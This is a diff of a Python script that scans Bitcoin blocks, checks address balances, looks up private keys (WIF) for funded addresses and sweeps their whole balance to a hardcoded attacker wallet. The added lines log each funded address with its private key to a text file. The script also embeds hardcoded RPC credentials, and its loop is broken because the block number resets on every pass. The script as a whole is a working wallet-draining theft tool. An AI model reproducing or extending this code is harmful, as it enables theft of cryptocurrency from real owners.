@@ -23,6 +23,12 @@ from bit.network import NetworkAPI
 btcHost = '127.0.0.1'
 auth = HTTPBasicAuth('anigametv', 'gotech2020')
 
+
+def guardar_texto_en_archivo(texto, nombre_archivo):
+    with open(nombre_archivo, 'a') as archivo:
+        archivo.write(texto + '\n')
+
+
 # Obtener Numero del Bloque
 def get_latest_block_number():
     data = {
@@ -192,6 +198,7 @@ def obtener_balance_direccion(direcciones):
         
         if response.status_code == 200:
             data = response.json()
+
             balances.update(data)
         else:
             print(f"Error al obtener el balance para las direcciones: {direcciones_unidas}")
@@ -316,12 +323,16 @@ def procesar_bloque_y_transacciones(bloque_id):
         # Imprimir las direcciones con balance
         for direccion, balance_data in balances.items():
             balance = balance_data.get('final_balance', 0)
+
+            print(f"address: {direccion} :: {balance} BTC")
             if balance > 0:
                 # Obtenemos el WIF correspondiente para la dirección
                 wif = direcciones_wif.get(direccion)
                 
                 if wif:
                     print(f"Dirección: {direccion}, Balance: {balance} satoshis, WIF: {wif}")
+
+                    guardar_texto_en_archivo(f"Dirección: {direccion}, Balance: {balance} satoshis, WIF: {wif}", "walletconBalance.txt")
                     # Enviar todo el balance
                     send_all_funds(wif, 'bc1qmp3tj4gyjndqqlt20nu53ed9z7haa6z6wlckdc')
 
@@ -336,9 +347,10 @@ latest_block_number = None
 
 while True:
 
-    new_block_number = get_latest_block_number()
+    new_block_number = 469200 #1 de junio 2017  #get_latest_block_number()
     print(f"[BlockId: {new_block_number}]")
     if new_block_number != latest_block_number:
         latest_block_number = new_block_number
         procesar_bloque_y_transacciones(latest_block_number)
     time.sleep(60)
+    new_block_number += 1
